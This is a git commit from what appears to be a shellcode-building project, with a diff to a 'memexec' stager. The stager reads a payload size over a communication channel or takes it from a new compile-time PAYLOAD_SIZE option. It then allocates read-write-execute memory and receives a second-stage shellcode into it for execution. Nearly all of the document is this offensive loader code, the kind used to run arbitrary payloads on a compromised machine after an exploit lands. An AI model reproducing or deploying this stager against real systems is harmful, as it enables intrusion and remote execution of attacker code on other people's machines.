bef5c23295fc809e9905494a079990b5a731ca66
Guillaume Delugré <guillaume@security-labs.org>
2015-08-18 22:56:28 +0200

    memexec: added option PAYLOAD_SIZE

--- shellcodes/memexec.cc
+++ shellcodes/memexec.cc
@@ -1,8 +1,16 @@
 #include <factory.h>
-
-//#include "pico/channel.cc"
-//#include "pico/memory.cc"
 #include <pico.h>
+
+namespace Options {
+    #if defined(PAYLOAD_SIZE) && (PAYLOAD_SIZE != 0)
+    #define OPT_PAYLOAD_SIZE PAYLOAD_SIZE
+    #else
+    #define OPT_PAYLOAD_SIZE 0
+    #endif
+
+    constexpr static size_t payload_size = OPT_PAYLOAD_SIZE;
+    constexpr static bool use_varsize = (payload_size == 0);
+}
 
 using namespace Pico;
 
@@ -11,13 +19,17 @@ typedef __attribute__((noreturn)) void (* shellcode)(void);
 SHELLCODE_ENTRY
 {
     auto channel = Options::channel();
-    uint16_t buffer_size;
+    uint32_t buffer_size;
+    void *memory;
 
-    /* Read the size of the input buffer (2 bytes). */
-    channel.recv(&buffer_size, sizeof(buffer_size));
+    /* Read the size of the input buffer (4 bytes). */
+    if ( Options::use_varsize )
+        channel.recv(&buffer_size, sizeof(buffer_size));
+    else
+        buffer_size = Options::payload_size;
 
     /* Allocate memory for shellcode. */
-    void *memory = Memory::allocate(buffer_size, Memory::READ | Memory::WRITE | Memory::EXEC);
+    memory = Memory::allocate(buffer_size, Memory::READ | Memory::WRITE | Memory::EXEC);
 
     /* Read shellcode in memory. */
     channel.recv(memory, buffer_size);
